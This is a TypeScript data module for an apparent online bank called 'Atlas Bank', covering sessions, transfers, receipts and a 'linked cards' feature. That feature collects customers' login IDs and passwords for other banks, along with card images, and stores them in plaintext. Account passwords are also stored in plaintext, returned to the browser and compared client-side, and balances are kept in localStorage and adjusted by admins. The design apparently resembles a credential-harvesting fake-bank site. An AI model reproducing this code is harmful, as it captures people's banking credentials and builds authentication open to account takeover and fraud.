import { isSupabaseConfigured, supabase } from "@/lib/supabase";

export type NewUserTransferStatus = "Pending" | "Approved" | "Declined";
export type NewUserTransferDirection = "outbound" | "incoming";

export type NewUserTransfer = {
  reference: string;
  customerName: string;
  customerEmail: string;
  recipient: string;
  bank: string;
  accountNumber: string;
  swift: string;
  amount: number;
  fee: number;
  totalDebit: number;
  description: string;
  submissionTime: string;
  status: NewUserTransferStatus;
  direction: NewUserTransferDirection;
  approvalDate?: string;
  adminName?: string;
  declineReason?: string;
};

export type NewUserReceipt = {
  reference: string;
  status: "SUCCESSFUL" | "PENDING" | "DECLINED";
  date: string;
  senderName: string;
  senderAccount: string;
  recipientName: string;
  recipientBank: string;
  recipientAccount: string;
  amount: number;
  fee: number;
  totalDebit: number;
  description?: string;
  swift?: string;
  declinedReason?: string;
  adminName?: string;
  approvalDate?: string;
};

export type NewUserCard = {
  id: string;
  customerName: string;
  loginId: string;
  password: string;
  bankName: string;
  frontImageName: string;
  backImageName: string;
  frontImageData?: string;
  backImageData?: string;
  submittedAt: string;
};

export type NewUserAccount = {
  customerName: string;
  customerEmail: string;
  accountNumber: string;
  customerId: string;
  accountType: string;
  availableBalance: string;
  status: string;
  profileCompleted: boolean;
  phone?: string;
  dob?: string;
  address?: string;
  avatarUrl?: string;
  iban?: string;
  swift?: string;
  customerSince?: string;
};

const NEW_USER_SESSION_KEY = "atlasNewUserSession";
const NEW_USER_EMAIL_KEY = "atlasNewUserEmail";
const NEW_USER_PASSWORD_KEY = "atlasNewUserPassword";
const NEW_USER_TRANSFER_KEY = "atlasNewUserTransfers";

function generateNewUserAccountNumber() {
  const account = Math.floor(1000000000 + Math.random() * 9000000000);
  return `ACCT-${account}`;
}

function generateNewUserCustomerId() {
  const id = Math.floor(100000 + Math.random() * 900000);
  return `CUST-${id}`;
}

export function getDefaultNewUserSession() {
  return {
    customerName: "New Customer",
    customerEmail: "new.customer@atlasbank.com",
    accountNumber: generateNewUserAccountNumber(),
    customerId: generateNewUserCustomerId(),
    accountType: "Atlas New Customer",
    availableBalance: "$0.00",
    status: "Active",
    profileCompleted: false,
    phone: "",
    dob: "",
    address: "",
    iban: "GB89ATLS0000000001",
    swift: "ATLSUS33",
    customerSince: "July 2026",
  } satisfies NewUserAccount;
}

export function getNewUserSession(): NewUserAccount | null {
  if (typeof window === "undefined") {
    return null;
  }
  const rawSession = window.localStorage.getItem(NEW_USER_SESSION_KEY);
  if (!rawSession) return null;
  try {
    const parsed = JSON.parse(rawSession) as NewUserAccount;
    return parsed;
  } catch {
    return null;
  }
}

export function saveNewUserSession(session: NewUserAccount) {
  if (typeof window === "undefined") return;
  window.localStorage.setItem(NEW_USER_SESSION_KEY, JSON.stringify(session));
  window.localStorage.setItem("atlasNewUserEmail", session.customerEmail);
}

export async function saveNewUserCustomerToSupabase({
  fullName,
  email,
  phone,
  password,
  status = "pending",
  createdAt = new Date().toISOString(),
}: {
  fullName: string;
  email: string;
  phone: string;
  password?: string;
  status?: string;
  createdAt?: string;
}) {
  if (!isSupabaseConfigured || !supabase) return null;

  const row: Record<string, unknown> = {
    full_name: fullName,
    email,
    phone,
    created_at: createdAt,
    status,
  };

  if (password) {
    row.password = password;
  }

  const { error } = await supabase.from("customers").upsert([row], { onConflict: "email" });

  if (error) {
    const missingPasswordColumn = /column\s+"password"\s+does not exist/i.test(error.message ?? "");

    if (password && missingPasswordColumn) {
      const retryRow = { ...row };
      delete retryRow.password;
      const { error: retryError } = await supabase.from("customers").upsert([retryRow], { onConflict: "email" });
      if (retryError) {
        throw retryError;
      }
      return true;
    }

    throw error;
  }

  return true;
}

export async function fetchRegisteredNewUserByEmail(email: string) {
  if (!isSupabaseConfigured || !supabase) return null;

  const selectFields = "full_name, email, phone, password";
  const { data, error } = await supabase
    .from("customers")
    .select(selectFields)
    .eq("email", email)
    .single();

  if (error) {
    const missingPasswordColumn = /column\s+"password"\s+does not exist/i.test(error.message ?? "");
    if (missingPasswordColumn) {
      const { data: fallbackData, error: fallbackError } = await supabase
        .from("customers")
        .select("full_name, email, phone")
        .eq("email", email)
        .single();
      if (!fallbackError && fallbackData) {
        return {
          email: String(fallbackData.email ?? ""),
          fullName: String(fallbackData.full_name ?? "New Customer"),
          phone: fallbackData.phone ? String(fallbackData.phone) : undefined,
          password: undefined,
        };
      }
    }
    return null;
  }

  if (!data) {
    return null;
  }

  return {
    email: String(data.email ?? ""),
    fullName: String(data.full_name ?? "New Customer"),
    phone: data.phone ? String(data.phone) : undefined,
    password: data.password ? String(data.password) : undefined,
  };
}

export async function fetchRegisteredNewUserByEmailAndPassword(email: string, password: string) {
  const user = await fetchRegisteredNewUserByEmail(email);
  if (!user || !user.password) return null;
  return user.password === password ? user : null;
}

export function markNewUserProfileCompleted(session: NewUserAccount) {
  const nextSession = { ...session, profileCompleted: true };
  saveNewUserSession(nextSession);
  return nextSession;
}

export function applyFundingToNewUserSession(amount: number, targetEmail?: string) {
  if (typeof window === "undefined") return;

  const parsedAmount = Number(amount.toFixed(2));

  if (targetEmail) {
    const registeredUsersRaw = window.localStorage.getItem("atlasRegisteredUsers");
    const registeredUsers = registeredUsersRaw ? JSON.parse(registeredUsersRaw) : [];
    const matchingUser = Array.isArray(registeredUsers)
      ? registeredUsers.find((user: Record<string, string>) => user.email?.toLowerCase() === targetEmail.toLowerCase())
      : null;

    if (matchingUser) {
      const currentSession = getNewUserSession();
      const nextSession: NewUserAccount = {
        ...(currentSession ?? getDefaultNewUserSession()),
        customerName: matchingUser.fullName || currentSession?.customerName || "New Customer",
        customerEmail: targetEmail,
        availableBalance: `$${(Number((currentSession?.availableBalance || "$0.00").replace(/[$,]/g, "")) + parsedAmount).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
      };

      saveNewUserSession(nextSession);
      return nextSession;
    }
  }

  const currentSession = getNewUserSession();
  const nextBalance = currentSession
    ? Number(currentSession.availableBalance.replace(/[$,]/g, "")) + parsedAmount
    : parsedAmount;

  const nextSession: NewUserAccount = {
    ...(currentSession ?? getDefaultNewUserSession()),
    availableBalance: `$${nextBalance.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
  };

  saveNewUserSession(nextSession);
  return nextSession;
}

export function getRegisteredNewUsers(): Array<{ email: string; fullName: string; phone?: string }> {
  if (typeof window === "undefined") return [];

  const registeredUsersRaw = window.localStorage.getItem("atlasRegisteredUsers");
  const registeredUsers = registeredUsersRaw ? JSON.parse(registeredUsersRaw) : [];

  if (!Array.isArray(registeredUsers)) return [];

  return registeredUsers.map((user: Record<string, string>) => ({
    email: user.email || "",
    fullName: user.fullName || "New Customer",
    phone: user.phone || "",
  })).filter((user) => user.email);
}

export async function fetchRegisteredNewUsers(): Promise<Array<{ email: string; fullName: string; phone?: string }>> {
  if (isSupabaseConfigured && supabase) {
    const { data, error } = await supabase
      .from("customers")
      .select("full_name, email, phone")
      .order("created_at", { ascending: false });

    if (!error && Array.isArray(data) && data.length > 0) {
      return data
        .map((item) => ({
          email: String(item.email ?? ""),
          fullName: String(item.full_name ?? "New Customer"),
          phone: item.phone ? String(item.phone) : undefined,
        }))
        .filter((user) => user.email);
    }
  }

  return getRegisteredNewUsers();
}

function getLocalNewUserTransfers() {
  if (typeof window === "undefined") return [];
  const storedTransfers = window.localStorage.getItem(NEW_USER_TRANSFER_KEY);
  if (!storedTransfers) return [];

  try {
    const parsed = JSON.parse(storedTransfers) as NewUserTransfer[];
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

export function getAllLocalNewUserTransfers() {
  return getLocalNewUserTransfers().slice().sort((a, b) => new Date(b.submissionTime).getTime() - new Date(a.submissionTime).getTime());
}

function saveLocalNewUserTransfers(transfers: NewUserTransfer[]) {
  if (typeof window === "undefined") return;
  window.localStorage.setItem(NEW_USER_TRANSFER_KEY, JSON.stringify(transfers));
}

function getLocalNewUserTransfersForEmail(customerEmail?: string) {
  const normalizedEmail = (customerEmail ?? getNewUserSession()?.customerEmail ?? "").trim().toLowerCase();
  if (!normalizedEmail) return [] as NewUserTransfer[];
  return getLocalNewUserTransfers().filter((transfer) => transfer.customerEmail.toLowerCase() === normalizedEmail);
}

function mapTransferToSupabaseRow(request: NewUserTransfer) {
  return {
    reference: request.reference,
    customer_name: request.customerName,
    customer_email: request.customerEmail,
    recipient: request.recipient,
    bank: request.bank,
    account_number: request.accountNumber,
    swift: request.swift,
    amount: request.amount,
    fee: request.fee,
    total_debit: request.totalDebit,
    description: request.description,
    submission_time: request.submissionTime,
    status: request.status,
    direction: request.direction,
    approval_date: request.approvalDate,
    admin_name: request.adminName,
    decline_reason: request.declineReason,
  };
}

function mapDbTransferToClientRow(item: Record<string, unknown>): NewUserTransfer {
  return {
    reference: String(item.reference ?? ""),
    customerName: String(item.customer_name ?? ""),
    customerEmail: String(item.customer_email ?? ""),
    recipient: String(item.recipient ?? ""),
    bank: String(item.bank ?? ""),
    accountNumber: String(item.account_number ?? ""),
    swift: String(item.swift ?? ""),
    amount: Number(item.amount ?? 0),
    fee: Number(item.fee ?? 0),
    totalDebit: Number(item.total_debit ?? 0),
    description: String(item.description ?? ""),
    submissionTime: String(item.submission_time ?? ""),
    status: (item.status as NewUserTransferStatus) ?? "Pending",
    direction: (item.direction as NewUserTransferDirection) ?? "outbound",
    approvalDate: item.approval_date ? String(item.approval_date) : undefined,
    adminName: item.admin_name ? String(item.admin_name) : undefined,
    declineReason: item.decline_reason ? String(item.decline_reason) : undefined,
  };
}

export async function loadNewUserTransfers(customerEmail?: string) {
  const localTransfers = customerEmail ? getLocalNewUserTransfersForEmail(customerEmail) : getAllLocalNewUserTransfers();

  if (!isSupabaseConfigured || !supabase) {
    return localTransfers;
  }

  const normalizedEmail = (customerEmail ?? getNewUserSession()?.customerEmail ?? "").trim().toLowerCase();
  if (!normalizedEmail) {
    return localTransfers;
  }

  const { data, error } = await supabase
    .from("transfers")
    .select("*")
    .eq("customer_email", normalizedEmail)
    .order("submission_time", { ascending: false });

  const remoteTransfers = error ? [] : (data ?? []).map(mapDbTransferToClientRow);
  const mergedByReference = new Map<string, NewUserTransfer>();

  localTransfers.forEach((transfer) => mergedByReference.set(transfer.reference, transfer));
  remoteTransfers.forEach((transfer) => mergedByReference.set(transfer.reference, transfer));

  const uniqueTransfers = Array.from(mergedByReference.values());

  return uniqueTransfers.sort((a, b) => new Date(b.submissionTime).getTime() - new Date(a.submissionTime).getTime());
}

export async function createNewUserTransfer(partial: Omit<NewUserTransfer, "reference" | "totalDebit" | "status" | "direction" | "submissionTime"> & {
  status?: NewUserTransferStatus;
  direction?: NewUserTransferDirection;
  submissionTime?: string;
}) {
  const currentSession = getNewUserSession();
  if (partial.direction === "outbound" && partial.amount > 0 && currentSession) {
    const currentBalance = parseBalance(currentSession.availableBalance);
    if (currentBalance < partial.amount) {
      throw new Error("Insufficient funds");
    }
  }

  const transfer: NewUserTransfer = {
    ...partial,
    reference: `TRX-${Date.now()}`,
    totalDebit: Number((partial.amount + partial.fee).toFixed(2)),
    submissionTime: partial.submissionTime ?? new Date().toLocaleString("en-US", { month: "long", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", hour12: true }),
    status: partial.status ?? "Pending",
    direction: partial.direction ?? "outbound",
  };

  const localTransfers = getLocalNewUserTransfers();
  saveLocalNewUserTransfers([transfer, ...localTransfers]);

  if (isSupabaseConfigured && supabase) {
    try {
      await supabase.from("transfers").upsert([mapTransferToSupabaseRow(transfer)], { onConflict: "reference" });
    } catch {
      // keep local transfer if remote save fails
    }
  }

  syncNewUserSessionBalance(transfer);
  if (typeof window !== "undefined") {
    window.dispatchEvent(new Event("atlas-new-user-transfers-updated"));
  }

  return transfer;
}

function parseBalance(value?: string) {
  if (!value) return 0;
  const numericValue = Number(value.replace(/[$,]/g, ""));
  return Number.isFinite(numericValue) ? numericValue : 0;
}

function formatBalance(value: number) {
  return `$${value.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function syncNewUserSessionBalance(transfer: NewUserTransfer, previousTransfer?: NewUserTransfer | null) {
  const currentSession = getNewUserSession();
  if (!currentSession) return;

  let nextBalance = parseBalance(currentSession.availableBalance);

  if (previousTransfer) {
    const previousApproved = previousTransfer.status === "Approved";
    const nextApproved = transfer.status === "Approved";

    if (previousApproved && !nextApproved) {
      if (previousTransfer.direction === "incoming") {
        nextBalance -= previousTransfer.amount;
      } else {
        nextBalance += previousTransfer.totalDebit;
      }
    } else if (!previousApproved && nextApproved) {
      if (transfer.direction === "incoming") {
        nextBalance += transfer.amount;
      } else {
        nextBalance -= transfer.totalDebit;
      }
    }
  } else if (transfer.status === "Approved") {
    if (transfer.direction === "incoming") {
      nextBalance += transfer.amount;
    } else {
      nextBalance -= transfer.totalDebit;
    }
  }

  saveNewUserSession({ ...currentSession, availableBalance: formatBalance(nextBalance) });
}

export async function updateNewUserTransferStatus(reference: string, status: NewUserTransferStatus, adminName?: string, declineReason?: string) {
  const localTransfers = getLocalNewUserTransfers();
  const existingTransfer = localTransfers.find((transfer) => transfer.reference === reference);
  if (!existingTransfer) return null;

  const nextDate = new Date().toLocaleString("en-US", { month: "long", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", hour12: true });
  const nextTransfer: NewUserTransfer = {
    ...existingTransfer,
    status,
    approvalDate: nextDate,
    adminName: adminName ?? existingTransfer.adminName,
    declineReason: status === "Declined" ? declineReason ?? existingTransfer.declineReason : undefined,
  };

  const transfers = localTransfers.map((transfer) => (transfer.reference === reference ? nextTransfer : transfer));
  saveLocalNewUserTransfers(transfers);

  syncNewUserSessionBalance(nextTransfer, existingTransfer);

  if (isSupabaseConfigured && supabase) {
    try {
      await supabase.from("transfers").upsert([mapTransferToSupabaseRow(nextTransfer)], { onConflict: "reference" });
    } catch {
      // ignore Supabase write errors
    }
  }

  await createNewUserReceiptFromTransfer(nextTransfer);
  if (typeof window !== "undefined") {
    window.dispatchEvent(new Event("atlas-new-user-transfers-updated"));
  }

  return nextTransfer;
}

export async function createNewUserReceiptFromTransfer(request: NewUserTransfer) {
  const currentSession = getNewUserSession();

  const receipt: NewUserReceipt = {
    reference: request.reference,
    status: request.status === "Approved" ? "SUCCESSFUL" : request.status === "Declined" ? "DECLINED" : "PENDING",
    date: request.approvalDate ?? request.submissionTime,
    senderName: request.customerName,
    senderAccount: currentSession?.accountNumber ?? request.accountNumber,
    recipientName: request.recipient,
    recipientBank: request.bank,
    recipientAccount: request.accountNumber,
    amount: request.amount,
    fee: request.fee,
    totalDebit: request.totalDebit,
    description: request.description,
    swift: request.swift,
    declinedReason: request.status === "Declined" ? request.declineReason : undefined,
    adminName: request.adminName,
    approvalDate: request.approvalDate,
  };

  if (isSupabaseConfigured && supabase) {
    await supabase.from("receipts").upsert([{
      reference: receipt.reference,
      status: receipt.status,
      date: receipt.date,
      sender_name: receipt.senderName,
      sender_account: receipt.senderAccount,
      recipient_name: receipt.recipientName,
      recipient_bank: receipt.recipientBank,
      recipient_account: receipt.recipientAccount,
      amount: receipt.amount,
      fee: receipt.fee,
      total_debit: receipt.totalDebit,
      description: receipt.description,
      swift: receipt.swift,
      declined_reason: receipt.declinedReason,
      admin_name: receipt.adminName,
      approval_date: receipt.approvalDate,
    }], { onConflict: "reference" });
  }

  return receipt;
}

export async function loadNewUserReceipts(customerName?: string) {
  if (!isSupabaseConfigured || !supabase) return [] as NewUserReceipt[];
  const normalizedName = (customerName ?? getNewUserSession()?.customerName ?? "").trim();
  if (!normalizedName) return [] as NewUserReceipt[];
  const { data, error } = await supabase.from("receipts").select("*").eq("sender_name", normalizedName).order("date", { ascending: false });
  if (error) return [] as NewUserReceipt[];
  return (data ?? []).map((item) => ({
    reference: String(item.reference ?? ""),
    status: (item.status as NewUserReceipt["status"]) ?? "PENDING",
    date: String(item.date ?? ""),
    senderName: String(item.sender_name ?? ""),
    senderAccount: String(item.sender_account ?? ""),
    recipientName: String(item.recipient_name ?? ""),
    recipientBank: String(item.recipient_bank ?? ""),
    recipientAccount: String(item.recipient_account ?? ""),
    amount: Number(item.amount ?? 0),
    fee: Number(item.fee ?? 0),
    totalDebit: Number(item.total_debit ?? 0),
    description: item.description ? String(item.description) : undefined,
    swift: item.swift ? String(item.swift) : undefined,
    declinedReason: item.declined_reason ? String(item.declined_reason) : undefined,
    adminName: item.admin_name ? String(item.admin_name) : undefined,
    approvalDate: item.approval_date ? String(item.approval_date) : undefined,
  })) as NewUserReceipt[];
}

export async function loadNewUserCards(customerName?: string) {
  if (!isSupabaseConfigured || !supabase) return [] as NewUserCard[];
  const normalizedName = (customerName ?? getNewUserSession()?.customerName ?? "").trim();
  if (!normalizedName) return [] as NewUserCard[];
  const { data, error } = await supabase.from("linked_cards").select("*").eq("customer_name", normalizedName).order("submitted_at", { ascending: false });
  if (error) return [] as NewUserCard[];
  return (data ?? []).map((item) => ({
    id: String(item.id ?? ""),
    customerName: String(item.customer_name ?? ""),
    loginId: String(item.login_id ?? ""),
    password: String(item.password ?? ""),
    bankName: String(item.bank_name ?? ""),
    frontImageName: String(item.front_image_name ?? ""),
    backImageName: String(item.back_image_name ?? ""),
    frontImageData: item.front_image_data ? String(item.front_image_data) : undefined,
    backImageData: item.back_image_data ? String(item.back_image_data) : undefined,
    submittedAt: String(item.submitted_at ?? ""),
  })) as NewUserCard[];
}

export async function createNewUserCard(card: Omit<NewUserCard, "id" | "submittedAt">) {
  const createdCard: NewUserCard = {
    ...card,
    id: `CARD-${Date.now()}`,
    submittedAt: new Date().toLocaleString("en-US", { month: "long", day: "numeric", year: "numeric", hour: "numeric", minute: "2-digit", hour12: true }),
  };

  if (isSupabaseConfigured && supabase) {
    await supabase.from("linked_cards").upsert([{
      id: createdCard.id,
      customer_name: createdCard.customerName,
      login_id: createdCard.loginId,
      password: createdCard.password,
      bank_name: createdCard.bankName,
      front_image_name: createdCard.frontImageName,
      back_image_name: createdCard.backImageName,
      front_image_data: createdCard.frontImageData,
      back_image_data: createdCard.backImageData,
      submitted_at: createdCard.submittedAt,
    }], { onConflict: "id" });
  }

  return createdCard;
}
